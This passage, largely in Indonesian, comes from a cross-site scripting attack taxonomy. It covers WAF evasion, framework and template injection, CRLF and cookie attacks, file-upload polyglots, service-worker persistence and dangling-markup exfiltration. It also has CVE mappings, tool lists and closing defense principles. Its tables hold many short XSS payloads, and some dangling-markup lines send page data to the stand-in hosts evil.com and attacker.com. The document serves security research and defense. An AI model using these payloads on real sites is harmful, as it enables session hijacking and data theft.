| **Parameter override** | WAF memeriksa param pertama, app menggunakan yang terakhir (atau sebaliknya) | Precedence parameter yang berbeda antara WAF dan aplikasi |
| **Array parameter confusion** | `?q[]=<script>&q[]=alert(1)` | Framework-specific array parameter handling |

### §8-4. AI-Generated Evasion (2025 Emerging)

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Adversarial payload generation** | ML model menghasilkan payload novel yang melewati ML-based WAF | WAF menggunakan signature atau ML detection; attacker menggunakan adversarial AI |
| **Contextual mutation** | AI mengadaptasi struktur payload berdasarkan pola response WAF yang diamati | Automated fuzzing dengan feedback loop |

---

## §9. Framework and Rendering Engine Context

Vector XSS spesifik untuk client-side framework, template engine, dan rendering pipeline.

### §9-1. Client-Side Template Injection (CSTI)

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **AngularJS sandbox escape** | `{{constructor.constructor('alert(1)')()}}` (v1.x, sandbox dihapus di 1.6+) | AngularJS 1.x; input pengguna dalam scope `ng-app` |
| **Vue v-html injection** | Direktif `v-html` me-render raw HTML termasuk script | Developer menggunakan `v-html` dengan user data |
| **Vue template compilation** | Server mencampur SSR template dengan client-side Vue compilation | Input pengguna mencapai Vue template compiler |
| **React dangerouslySetInnerHTML** | `dangerouslySetInnerHTML={{__html: userInput}}` | Developer secara eksplisit memilih unsafe rendering |
| **React SSR hydration mismatch** | HTML yang di-render server berbeda dari client hydration, menyebabkan DOM yang tidak terduga | Output SSR mengandung input pengguna yang tidak cocok dengan ekspektasi client |
| **Svelte @html directive** | `{@html userInput}` me-render raw HTML | Direct raw HTML rendering dalam Svelte |
| **Expression sandbox escape via toString gadget** | JavaScript expression sandbox (custom eval wrapper, template engine sandbox) membatasi direct property access tetapi mengizinkan implicit type coercion. Memicu implicit `toString` via string concatenation (`'' + obj`) atau explicit `.toString()` pada native object memanggil prototype chain object, yang mungkin mengembalikan `Function` constructor atau reference privileged lainnya di luar sandbox scope. Chaining `[].constructor.constructor('return this')()` melalui coercion keluar dari sandbox untuk mengakses global `window` object | Expression sandbox mengizinkan member access tetapi membatasi reference `constructor` langsung; jalur implicit coercion ke privileged prototype ada (CVE-2025-59840, lab.ctbb.show "Vega" research, 2025) |

### §9-2. Markdown and Rich Text Rendering

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Markdown link injection** | `[click](javascript:alert(1))` dalam markdown parser | Parser tidak menghilangkan protokol `javascript:` (CVE-2025-24981) |
| **Markdown HTML passthrough** | `<script>alert(1)</script>` di-render verbatim dalam markdown | Parser mengizinkan raw HTML (default umum) |
| **Markdown image injection** | `![x](data:text/html,<script>alert(1)</script>)` atau `<img>` dengan event handler | Parser tidak mensanitasi image source URI |
| **HTML entity bypass in markdown** | `&#106;avascript:` dalam link URL melewati denylist dari `javascript:` | Filter memeriksa string literal; parser mendecode entity |
| **Rich text editor XSS** | WYSIWYG editor (TinyMCE, CKEditor, Quill) mengizinkan script injection via HTML mode | Output sanitization dari editor content tidak memadai |
| **Clipboard/Paste injection** | HTML/SVG berbahaya dikirim via clipboard paste melewati input sanitization — paste handler menyisipkan DOM fragment yang tidak disanitasi mengandung event handler atau script element ke region `contenteditable` | Rich-text editor atau element `contenteditable` memproses paste event tanpa clipboard content sanitization |
| **AMP for Email / Dynamic Email XSS** | AMP for Email (Gmail, Yahoo) mengizinkan dynamic content dalam email via subset terbatas dari HTML/CSS/AMP components. Perbedaan parsing CSS antara sanitizer email client dan rendering engine-nya mengizinkan injeksi tag `<meta>` via CSS directive, melewati HTML restriction AMP validator dan mengganti header CSP untuk mengaktifkan script execution dalam email rendering context | Email client mendukung AMP4Email/dynamic email rendering; CSS parser menginterpretasikan construct sebagai HTML yang tidak ditangkap AMP validator |

### §9-3. Server-Side Template Injection (SSTI) to XSS

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Jinja2/Twig XSS** | `{{ '<script>alert(1)</script>' }}` tanpa auto-escaping | Auto-escape dinonaktifkan atau filter `|safe` digunakan |
| **ERB unescaped output** | `<%== user_input %>` atau `<%= raw(user_input) %>` dalam Rails 3+ | `<%= %>` auto-escapes secara default dalam Rails 3+; `<%== %>` atau `raw()` melewati escaping. Dalam Rails 2, `<%= %>` tidak aman tanpa helper `h()` |
| **PHP echo injection** | `<?php echo $_GET['x']; ?>` tanpa `htmlspecialchars()` | Direct output dari input pengguna |
| **Handlebars triple-stash** | `{{{ userInput }}}` me-render unescaped HTML | Triple-mustache melewati auto-escaping |

---

## §10. Protocol and Transport-Level Context

XSS tercapai melalui manipulasi HTTP protocol feature, cookie handling, atau content negotiation.

### §10-1. HTTP Response Splitting / CRLF Injection

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Header injection to body** | `\r\n\r\n<script>alert(1)</script>` disuntikkan ke HTTP header menghentikan header, memulai body | Input pengguna direfleksikan dalam HTTP response header tanpa CRLF filtering |
| **Content-Type override** | CRLF injection menambahkan header `Content-Type: text/html` | Response aslinya non-HTML; CRLF injection mungkin |
| **Set-Cookie injection** | Menyuntikkan header `Set-Cookie` untuk menanam nilai cookie berbahaya | Nilai cookie kemudian di-render dalam DOM |

### §10-2. Cookie-Based XSS Vectors

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Cookie sandwich attack** | Memanipulasi cookie `$Version` untuk mengalihkan server ke RFC2109 parsing, menempatkan nilai cookie HttpOnly di antara attacker cookie | Apache Tomcat (8.5.x, 9.0.x, 10.0.x); Chrome mengizinkan nama cookie yang diawali `$` dari JS |
| **Phantom $Version cookie** | Mengatur `$Version=1` dari JavaScript memaksa legacy cookie parsing di server | Server mendukung fallback RFC2109; browser Chrome |
| **Cookie value to DOM** | Nilai cookie yang mengandung payload XSS di-render via client-side JS | Aplikasi membaca dan me-render cookie dalam DOM |
| **__Host/__Secure prefix bypass** | Melewati cookie prefix protection untuk mengatur cookie yang mengganti authenticated session | Penelitian terbaru mendemonstrasikan teknik prefix bypass |

### §10-3. File Upload and Content Delivery XSS

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **SVG file upload** | SVG yang di-upload mengandung `<script>` atau event handler; disajikan dengan `image/svg+xml` | Aplikasi mengizinkan upload SVG; serve dari same origin |
| **HTML file upload** | File `.html` di-upload dan dapat diakses secara langsung | Tidak ada content-type restriction; same-origin serving |
| **PDF XSS** | Struktur internal PDF menyediakan multiple JavaScript execution trigger: `OpenAction` (auto-execute saat dokumen terbuka), annotation `URI`/`JavaScript` action (execute saat diklik), `AcroForm` field validation script, dan `SubmitForm` action untuk data exfiltration. PDF viewer built-in Chrome dan Adobe Reader mengimplementasikan subset JS API yang berbeda, menciptakan parser-differential bypass opportunity di mana payload yang diblokir oleh satu renderer dieksekusi di yang lain | `Content-Disposition: inline`; browser PDF JS diaktifkan; server-side PDF content inspection tidak ada atau hanya memeriksa subset dari tipe action |
| **PDF client-side data exfiltration** | PDF yang dibuka dalam browser mewarisi origin dari domain hosting, mengaktifkan same-origin data access. PDF JavaScript API menyediakan exfiltration via `this.submitForm()` — mengirim data yang dicuri sebagai form submission ke URL eksternal. Text extraction API (`getPageNthWord()`, `getPageNumWords()`) enumerate page content secara terprogram. FormCalc dalam PDF forms (didukung oleh Adobe Reader/Acrobat; InsertScript, 2018) dapat membaca arbitrary same-origin URL via `Get()` dan exfiltrate content via `Post()` — mengaktifkan cross-page data theft tanpa JavaScript. Berbeda dari kerentanan server-side PDF generation (SSRF, file read): ini adalah client-side PDF rendering exploitation di mana PDF yang di-upload user atau dibuat attacker meng-exfiltrate data dari origin aplikasi web hosting | PDF disajikan inline dari origin aplikasi; browser PDF viewer mendukung JS API atau FormCalc; same-origin policy memberikan PDF akses ke resource aplikasi (Gareth Heyes, 2020; InsertScript, 2018 untuk FormCalc) |
| **XML file with XSS** | XML yang di-upload diproses dengan XSLT yang mengandung script | XML processing dengan stylesheet yang dikontrol pengguna |
| **Polyglot file** | File valid sebagai JPEG dan HTML (atau GIF dan HTML) | MIME sniffing diaktifkan; file disajikan tanpa `nosniff` |
| **Polyglot JPEG as CSP-allowed script** | Payload JavaScript yang disematkan dalam JPEG comment section (marker `0xFF 0xFE`) membuat file yang valid sebagai JPEG dan valid sebagai JavaScript — JPEG header bytes (`0xFF 0xD8 0xFF 0xE0`) membentuk JS expression yang secara sintaksis valid (tetapi tidak bermakna). Ketika CSP menentukan `script-src 'self'`, attacker yang dapat meng-upload image mereferensi JPEG yang di-upload sebagai script source: `<script charset="ISO-8859-1" src="/uploads/polyglot.jpg"></script>`. Atribut `charset="ISO-8859-1"` diperlukan untuk mencegah encoding-related parse error. Melewati CSP karena file disajikan dari same origin dan lolos pemeriksaan `'self'`. Dukungan browser: Safari, Edge, IE11; **bukan Chrome**. Firefox didukung sampai v51 (di-patch) | CSP `script-src 'self'`; attacker dapat meng-upload file ke same origin; file yang di-upload dapat diakses oleh direct URL; browser non-Chrome atau Firefox < 51; `charset="ISO-8859-1"` pada script tag (Gareth Heyes, 2016) |
| **Polymorphic image XSS** | File image (JPEG, GIF, BMP) menyematkan payload XSS dalam pixel data, comment field, atau structural segment yang bertahan melalui server-side image re-processing (resize, transcode, metadata strip), tetap executable ketika output image di-render inline atau via MIME sniffing | Same-origin serving; image processing mempertahankan segment yang membawa payload; `X-Content-Type-Options: nosniff` tidak ada |

### §10-4. HTTP/2 Protocol-Level XSS

Binary framing dan HPACK header compression HTTP/2 memperkenalkan vector XSS yang tidak ada dalam HTTP/1.1. Payload yang disuntikkan melalui fitur H2-spesifik dapat bertahan protocol downgrade translation, melewati WAF yang hanya menginspeksi traffic HTTP/1.

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **H2 header value injection via downgrade** | HTTP/2 mengizinkan nilai header yang mengandung karakter yang dilarang dalam HTTP/1.1 (newlines, carriage returns, null bytes). Ketika front-end proxy menurunkan H2 ke H1, karakter ini dapat memecah header boundary, menyuntikkan response header atau body content yang mengandung payload XSS | Front-end H2 → backend H1 dengan header value passthrough; sanitization tidak memadai selama protocol downgrade |
| **Pseudo-header reflection** | HTTP/2 pseudo-headers (`:path`, `:authority`, `:scheme`) membawa nilai yang menjadi bagian dari HTTP/1 request line selama downgrade. Menyuntikkan payload XSS ke dalam nilai pseudo-header menempatkannya dalam context di mana mereka mungkin direfleksikan dalam error page, debug output, atau log | Downgrade H2 → H1; backend merefleksikan request path atau host dalam response tanpa encoding |
| **HPACK dynamic table poisoning** | Kompresi HPACK mengizinkan nilai header yang dikirim sebelumnya untuk direferensi oleh index. Attacker dapat mengisi dynamic table dengan nilai berbahaya yang kemudian di-expand dalam context yang tidak terduga, menyisipkan payload XSS ke dalam header yang direfleksikan oleh aplikasi | Shared HPACK state antara multiplexed H2 connection; aplikasi merefleksikan nilai header dalam response body |

---

## §11. Persistence and Advanced Exploitation Context

Teknik untuk mempertahankan akses XSS di luar single page load dan memaksimalkan dampak eksploitasi.

### §11-1. Service Worker Persistence

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Malicious SW registration** | XSS mendaftarkan service worker yang mencegat semua request dan menyuntikkan payload | Aplikasi menyajikan file JS dari same scope; HTTPS |
| **SW cache poisoning** | Service worker menimpa cached JS/HTML response dengan versi berbahaya | Service worker yang ada menggunakan Cache API; XSS dapat memodifikasi cache |
| **SW as C2 channel** | Service worker mempertahankan persistent communication dengan server attacker | SW push notification atau periodic sync sebagai command channel |
| **SW via DOM clobbering** | DOM clobbering menimpa service worker registration URL | Service worker path dimuat dari DOM property yang dapat di-clobber |

Service worker bertahan di seluruh session sampai diganti atau dihapus secara manual (average update cycle: ~40 hari), menjadikannya mekanisme persistence XSS paling powerful.

### §11-2. Blind XSS

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Admin panel injection** | Payload disimpan dalam field input pengguna, trigger ketika admin melihat data | Admin panel me-render user data tanpa sanitization |
| **Log/monitoring injection** | Payload XSS dalam User-Agent, Referer, atau header lain yang di-log dan di-render dalam dashboard | Log viewer me-render HTML dari data yang di-log |
| **Email/notification injection** | Payload trigger ketika notification di-render dalam webmail atau notification center | HTML rendering dalam context notification/email |
| **Support ticket injection** | Payload disimpan dalam deskripsi ticket, fire dalam browser agent | Support platform me-render HTML ticket |

Payload Blind XSS biasanya menggunakan `import()` atau external script loading dengan out-of-band reporting via tool seperti XSS Hunter.

### §11-3. Scriptless Exploitation (Dangling Markup)

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Unclosed img tag** | `<img src='https://evil.com/?` menangkap HTML selanjutnya sebagai bagian dari URL sampai quote berikutnya | CSP memblokir script tetapi mengizinkan image; injection sebelum data sensitive |
| **Unclosed form action** | `<form action='https://evil.com/?` menangkap form data termasuk CSRF token | Form data antara injection dan quote berikutnya di-exfiltrate |
| **Unclosed textarea** | `<textarea>` menangkap page content sampai closing tag | Exfiltrates visible page content |
| **Base tag redirect** | `<base href='https://evil.com/'>` menyebabkan semua relative URL resolve ke domain attacker | Tidak ada directive `base-uri` CSP; relative asset/form path di halaman |
| **Form hijacking via `form-action` CSP gap** | Directive `form-action` tidak dicakup oleh `default-src` dalam CSP: attacker menyuntikkan `<form action="https://attacker.com">` atau menambahkan atribut `formaction` ke existing form button. Password manager mengisi otomatis credentials ke dalam field form yang dikontrol attacker. Form submission bukan script execution, jadi bahkan CSP ketat yang memblokir inline script dan `eval` di-bypass. Kasus real-world: password theft pada instance Infosec Mastodon | CSP tidak memiliki directive `form-action 'none'` atau `form-action 'self'` eksplisit; injection point di dalam atau sebelum form; password manager auto-fill diaktifkan (Gareth Heyes, 2024) |
| **Dangling iframe with lazy loading** | `<iframe loading="lazy" src="https://attacker.com/?` menunda loading via atribut `loading="lazy"`, mengaktifkan dangling markup capture di seluruh tag boundary — atribut `src` yang tidak tertutup mengonsumsi HTML selanjutnya sampai quote yang cocok. Berbeda dari teknik dangling markup DOM-based 2018: lazy loading menunda request iframe sampai element mendekati viewport, mengizinkan browser untuk mengakumulasi lebih banyak page content ke dalam dangling URL sebelum request fire | CSP tidak membatasi iframe `src` ke same origin; injection point sebelum content sensitive; browser mendukung lazy loading (Gareth Heyes, 2022) |

### §11-4. Self-XSS Escalation

| Subtype | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Credentialless iframe + login CSRF** | Self-XSS (di mana user hanya dapat menyuntikkan script ke session mereka sendiri) di-escalate menjadi full attack: attacker me-embed target application dalam iframe `credentialless` (yang memuat halaman tanpa cookie, membuatnya unauthenticated), kemudian melakukan login CSRF untuk mengautentikasi iframe sebagai account attacker (di mana payload self-XSS disimpan). Payload dieksekusi dalam browser victim dalam origin target, mendapatkan akses ke cookie victim dan same-origin storage via DOM API | Kerentanan Self-XSS; endpoint login tidak memiliki proteksi CSRF; target mengizinkan framing (tidak ada `X-Frame-Options` atau `frame-ancestors` yang permissive); browser mendukung atribut iframe `credentialless` |
| **Window reference escalation** | Setelah self-XSS fire dalam credentialless iframe yang diautentikasi sebagai attacker, script yang disuntikkan memperoleh reference ke authenticated context halaman parent via `window.open()` atau top-level navigation, meng-escalate dari attacker-session XSS ke victim-session compromise | Self-XSS dalam credentialless frame + kemampuan untuk menavigasi atau membuka window dalam target origin |
| **SSO gadget chain (OAuth/OIDC flow)** | OAuth/OIDC authorization flow menciptakan cross-origin navigation chain (RP → IdP → RP) yang membawa state yang dapat dipengaruhi attacker melalui URL parameter (`state`, `redirect_uri`, `login_hint`). Attacker membuat authorization URL yang merute victim melalui IdP authentication dan kembali ke halaman RP di mana payload self-XSS yang disimpan dieksekusi — dalam context post-authentication victim. Berbeda dari credentialless iframe escalation, ini menggunakan authentication victim sendiri daripada memaksa session attacker | Self-XSS pada halaman yang dapat dijangkau dari OAuth callback flow; OAuth flow mempertahankan navigasi ke halaman yang rentan (lihat `oauth.md` §10-4) |
| **Token endpoint callback injection** | Dalam implicit atau hybrid OAuth flow, authorization response parameter (code, token, error, state) diproses oleh client-side JavaScript pada halaman callback. Jika pemrosesan ini memiliki injection flaw, attacker membuat forged authorization response URL dengan nilai berbahaya yang memicu XSS ketika callback handler mengevaluasinya — meng-escalate parameter injection ke full XSS dalam context authenticated | Client-side OAuth callback processing dengan sanitization tidak memadai; implicit atau hybrid flow (lihat `oauth.md` §10-4) |
| **javascript: pseudo-protocol in SSO redirect** | OAuth 2.0 dan SAML flow menggunakan HTTP redirect (302) dan auto-submitting HTML form (POST binding) untuk mengangkut token antar pihak. Ketika AS atau SP menghasilkan auto-submit form dengan URL `action` yang dapat dikontrol user (misalnya, dari `redirect_uri` atau `RelayState`), attacker menyuntikkan `javascript:` sebagai form action. Browser mengeksekusi pseudo-protocol URI dalam context dari halaman yang menghosting auto-submit form — yang merupakan origin IdP atau SP — mencapai XSS dalam context authentication yang sangat privileged. PKCE dan parameter `state` tidak mencegah ini karena injection terjadi dalam transport mechanism, bukan authorization grant | Auto-submit form action berasal dari parameter yang dapat dikontrol attacker (`redirect_uri`, `RelayState`); validasi scheme tidak memadai (tidak ada allowlist yang membatasi ke `https://`); POST binding dalam SAML atau response mode `form_post` dalam OAuth (Lauritz Holtmann, 2024) |

---

## Attack Scenario Mapping (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama |
|---|---|---|
| **Session Hijacking** | Web app apa pun dengan session cookie | §1 + §3 + §10-2 — Eksekusi JS untuk meng-exfiltrate `document.cookie` atau menggunakan cookie sandwich |
| **Account Takeover** | App dengan API token atau OAuth | §3-3 + §6-3 + §4-3 — DOM XSS chain dengan postMessage leak dan redirect exploitation |
| **Credential Phishing** | Aplikasi authenticated apa pun | §1-2 + §11-2 — Suntikkan fake login form via stored/blind XSS |
| **Data Exfiltration (scripted)** | App dengan sensitive client-side data | §3-2 + §6-3 — Baca DOM content, API response, atau cross-origin data |
| **Data Exfiltration (scriptless)** | Aplikasi yang diproteksi CSP | [`css-injection.md`](css-injection.md) §1 + §11-3 — CSS selector dan dangling markup leak data tanpa JS |
| **Persistent Compromise** | Aplikasi HTTPS | §11-1 — Service worker registration untuk long-term payload injection |
| **Worm Propagation** | Platform sosial, aplikasi messaging | §1 + §3-2 — Self-propagating stored XSS yang mereplikasi via fitur sosial |
| **Cache Poisoning** | Aplikasi CDN/proxy-fronted | §7-3 + §8-3 — Suntikkan XSS ke cached response via MIME confusion atau parameter pollution |
| **WAF/ACL Bypass** | Aplikasi enterprise di belakang WAF | §8 — Bypass WAF untuk mencapai XSS yang mendasarinya, chain dengan §1–§4 untuk eksekusi |
| **Keylogging / Surveillance** | Aplikasi targeted apa pun | §1-2 + §11-1 — Event listener menangkap keystrokes; service worker mempertahankan akses |
| **Cryptomining** | Aplikasi web high-traffic | §1-1 + §11-1 — Suntikkan mining script; bertahan via service worker |

---

## CVE / Bounty Mapping (2024–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|---|---|---|
| §7-1 (Node flattening mXSS) | CVE-2024-47875 (DOMPurify < 3.1.3) | DOMPurify sanitization bypass; arbitrary JS execution dalam semua aplikasi yang bergantung |
| §7-1 (Regex sanitizer bypass) | CVE-2025-26791 (DOMPurify < 3.2.4) | mXSS via regex template literal yang tidak benar dalam mode `SAFE_FOR_TEMPLATES` |
| §6-2 (Prototype pollution → sanitizer) | CVE-2024-45801 (DOMPurify ≤ 3.0.8) | Prototype pollution dari `Node.prototype.after` melewati Trusted Types |
| §6-1 (DOM clobbering → script load) | CVE-2024-43788 (Webpack) | DOM clobbering dalam `AutoPublicPathRuntimeModule` mengarah ke XSS |
| §6-1 (DOM clobbering → router) | CVE-2024-47885 (Astro) | DOM clobbering dalam client-side router mengaktifkan stored XSS |
| §6-1 (DOM clobbering → bundler) | CVE-2024-47068 (Rollup) | `import.meta.url` clobbering dalam bundled script; dampak npm supply chain |
| §9-2 (Markdown link injection) | CVE-2025-24981 (Nuxt MDC) | XSS via `javascript:` yang di-encode HTML-entity dalam markdown link URL |
| §9-2 (Markdown to JSX) | CVE-2024-21535 (markdown-to-jsx) | XSS via malicious iframe dalam properti `src` markdown |
| §2-3 (Stored XSS in PAN-OS) | CVE-2024-5920 (Palo Alto PAN-OS) | Admin impersonation via stored XSS yang dipush dari Panorama |
| §10-1 (CRLF to XSS) | CVE-2024-52875 (GFI KerioControl) | CRLF injection dalam parameter `dest`; 1-click RCE chain |
| §6-3 (postMessage to XSS) | CVE-2024-49038 (Microsoft Copilot Studio) | CVSS 9.3; missing origin validation mengaktifkan token theft |
| §9-1 (Vue template XSS) | CVE-2024-6783 (vue-template-compiler) | Prototype pollution mengaktifkan XSS dalam Vue 2.x template compiler |
| §6-3 (postMessage chain) | ZoomInfo Chat (Juli 2024) | Two-stage: token leakage via `postMessage('*')` + DOM XSS |
| §6-3 (postMessage ATO) | Meta Conversion API Gateway (Jan 2025) | Zero-click account takeover via unvalidated postMessage origin. Bounty $12,500 |
| §10-2 (Cookie sandwich) | Apache Tomcat (penelitian 2025) | HttpOnly cookie theft via RFC2109 parsing switch; phantom `$Version` cookie |
| §8-3 (Parameter pollution) | Penelitian WAF bypass (2024) | 14 dari 17 konfigurasi WAF major di-bypass (AWS, GCP, Azure, Cloudflare) |
| §9-1 (Expression sandbox escape) | CVE-2025-59840 (Vega) | Expression sandbox bypass via implicit toString gadget chain; arbitrary JS execution |
| §10-3 (QR code injection context) | CVE-2019-17003 (Firefox QR reader) | XSS via malicious QR code yang di-scan oleh reader built-in Firefox; script execution dalam privileged browser context |
| §10-3 (Embedded application sandbox escape) | CVE-2024-32472 (Excalidraw) | Sandbox escape via `gist.github` iframe embedding; arbitrary JavaScript execution dalam drawing application |
| §7-1 (Element rename/unrename bypass) | Skiff/Proton Mail XSS (SonarSource, 2023) | Email client sanitizer bypass; arbitrary JavaScript execution dalam mailbox victim via email yang dibuat |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **XSStrike** (Scanner) | Reflected, DOM, Blind XSS | Intelligent fuzzing dengan browser-engine verification; multi-parser payload generation |
| **Burp Suite Scanner** (Commercial) | Semua tipe XSS | Crawl-and-audit dengan DOM analysis; passive/active scanning |
| **DOM Invader** (Burp Extension) | DOM XSS, Prototype Pollution | Automated DOM source-to-sink analysis; prototype pollution gadget scanner |
| **XSS Hunter** (Blind XSS) | Blind/Stored XSS | Out-of-band payload reporting dengan screenshot dan DOM snapshot |
| **DOMPurify** (Sanitizer) | mXSS, HTML injection | Server/client-side HTML sanitization; mutation rule yang secara teratur diperbarui |
| **Trusted Types** (Browser API) | DOM XSS | Browser-enforced policy yang memerlukan sanitized types untuk DOM sink |
| **xssFuzz** (Fuzzer) | WAF bypass, CSP misconfig | Tag/attribute fuzzing; CSP configuration analysis |
| **XSSGAI** (AI Fuzzer) | WAF bypass | ML-generated adversarial payload; 80% bypass rate terhadap SOTA WAF |
| **Shadow Workers** (C2) | XSS post-exploitation | Service worker-based persistence dan proxying framework |
| **Knoxss** (AI Scanner) | Semua tipe XSS | AI-powered automated deep scanning; minimal configuration |
| **CSP Evaluator** (Google) | CSP configuration | Static analysis dari Content Security Policy untuk directive yang rentan bypass |
| **RetireJS** (Library Scanner) | Library yang rentan yang diketahui | Mendeteksi JS library yang outdated dengan kerentanan XSS yang diketahui |
| **Semgrep** (SAST) | Source code XSS pattern | Static analysis rule untuk `innerHTML`, `eval`, `dangerouslySetInnerHTML`, dll. |

---

## Summary: Core Principles

**Mengapa XSS bertahan.** Cross-site scripting secara fundamental adalah injection problem yang timbul dari desain inti web: HTML, CSS, dan JavaScript berkoeksistensi dalam dokumen tunggal yang di-parse oleh pipeline context-dependent interpreter. Setiap transisi antar parsing context — HTML ke attribute, attribute ke URL, URL ke JavaScript, serialized DOM ke live DOM — menciptakan opportunity bagi input yang dikontrol attacker untuk menyeberangi trust boundary. Berbeda dengan SQL injection, yang secara struktural dapat dihilangkan melalui parameterized query, XSS tidak memiliki single architectural solution karena injection surface didistribusikan di setiap layer dari browser's rendering pipeline.

**Mengapa incremental fixes gagal.** Setiap defense mengatasi satu layer sambil membiarkan layer lain terexpose. Output encoding mencegah §1 dan §2 tetapi tidak §3 (JavaScript context) atau §6 (DOM API). Content Security Policy memblokir inline script tetapi dapat di-bypass via JSONP endpoint (§4), nonce leakage via CSS (`css-injection.md` §5-1), atau base tag injection (§1-3). HTML sanitizer seperti DOMPurify mencegah direct injection tetapi secara sistematis dikalahkan oleh mutation XSS (§7) — kategori yang ada tepatnya karena sanitizer dan browser mengimplementasikan algoritma HTML parsing yang berbeda. WAF beroperasi pada raw HTTP dan tidak dapat memodelkan browser's multi-stage parsing pipeline, membuatnya secara fundamental tidak mampu membedakan payload berbahaya dari yang benign dalam context (§8). Penambahan Trusted Types (§6) dan Sanitizer API menunjukkan kemajuan, tetapi adopsi tetap terbatas, dan keduanya memerlukan integrasi level aplikasi yang signifikan.

**Defense struktural yang sebenarnya terlihat seperti apa.** Eliminasi XSS yang sebenarnya memerlukan defense di setiap pipeline stage secara bersamaan: (1) context-aware output encoding di level template (bukan escaping manual), (2) strict CSP dengan nonce-per-request dan tanpa `unsafe-inline`, (3) Trusted Types enforcement untuk menghilangkan DOM XSS sink, (4) `X-Content-Type-Options: nosniff` untuk mencegah MIME confusion, (5) atribut cookie `HttpOnly`, `Secure`, `SameSite` untuk membatasi dampak post-exploitation, dan (6) input validation di level semantik (bukan pattern matching). Framework yang mengimplementasikan ini secara default (auto-escaping template, Trusted Types integration, CSP built-in) merepresentasikan jalur paling menjanjikan ke depan — tetapi bahkan mereka tidak dapat melindungi terhadap semua kategori dalam taxonomi ini, khususnya mutation XSS (§7) dan prototype pollution gadget (§6-2), yang mengeksploitasi celah antara apa yang dianggap "aman" oleh komponen tunggal apa pun dan apa yang browser akhirnya eksekusi.

---

## References

- PortSwigger Research. "Cross-Site Scripting (XSS) Cheat Sheet — 2026 Edition." https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger Research. "Bypassing DOMPurify again with mutation XSS." https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
- PortSwigger Research. "Stealing HttpOnly cookies with the cookie sandwich technique." https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
- PortSwigger Research. "Bypassing WAFs with the phantom $Version cookie." https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie
- PortSwigger Research. "Cookie Chaos: How to bypass __Host and __Secure cookie prefixes." https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes
- PortSwigger Research. "Exploiting XSS in hidden inputs and meta tags." https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags
- PortSwigger Research. "SVG animate XSS vector." https://portswigger.net/research/svg-animate-xss-vector
- PortSwigger Research. "Hijacking service workers via DOM Clobbering." https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- PortSwigger Research. "Evading CSP with DOM-based dangling markup." https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
- PortSwigger Research (Gareth Heyes). "Bypassing CSP using polyglot JPEGs" (2016). https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs
- PortSwigger Research (Gareth Heyes). "Portable Data exFiltration: XSS for PDFs" (2020). https://portswigger.net/research/portable-data-exfiltration
- PortSwigger Research (Gareth Heyes). "Bypassing CSP with dangling iframes" (2022). https://portswigger.net/research/bypassing-csp-with-dangling-iframes
- PortSwigger Research (Gareth Heyes). "Using form hijacking to bypass CSP" (2024). https://portswigger.net/research/using-form-hijacking-to-bypass-csp
- PortSwigger Research. "New exotic events in the XSS cheat sheet." https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet
- Mizu.re. "Exploring the DOMPurify library: Bypasses and Fixes." https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
- Securitum Research. "Mutation XSS via namespace confusion — DOMPurify < 2.0.17 bypass." https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
- BeaconRed Research. "When Purification Fails: Exploiting DOMPurify's Leftovers." https://shaheen.beaconred.net/research/2025/05/28/when-purification-fails.html
- CVE News. "CVE-2024-47875 — Breaking Down the DOMPurify mXSS Vulnerability." https://www.cve.news/cve-2024-47875/
- CVE News. "CVE-2025-26791 — Exploiting DOMPurify's Regular Expression Bug for mXSS." https://www.cve.news/cve-2025-26791/
- GitHub Advisory. "Webpack AutoPublicPathRuntimeModule DOM Clobbering XSS (GHSA-4vvj-4cpr-p986)." https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
- GitHub Advisory. "Astro client-side router DOM Clobbering XSS (CVE-2024-47885)." https://advisories.gitlab.com/pkg/npm/astro/CVE-2024-47885/
- Buer.haus. "Go Go XSS Gadgets: Chaining a DOM Clobbering Exploit in the Wild." https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
- USENIX Security 2025. "The DOMino Effect: Detecting and Exploiting DOM Clobbering Gadgets." https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-858-liu-zhengyu.pdf
- Ethiack Blog. "Bypassing WAFs for Fun and JS Injection with Parameter Pollution." https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
- TrustedSec. "Persistence Through Service Workers." https://trustedsec.com/blog/persistence-through-service-workers-part-1-introduction-and-target-application-setup
- Shadow Workers Project. https://shadow-workers.github.io/
- Akamai Blog. "Abusing the Service Workers API." https://www.akamai.com/blog/security/abusing-the-service-workers-api
- Microsoft MSRC. "Weaponizing cross site scripting: When one bug isn't enough." https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough
- Microsoft MSRC. "PostMessaged and Compromised." https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised
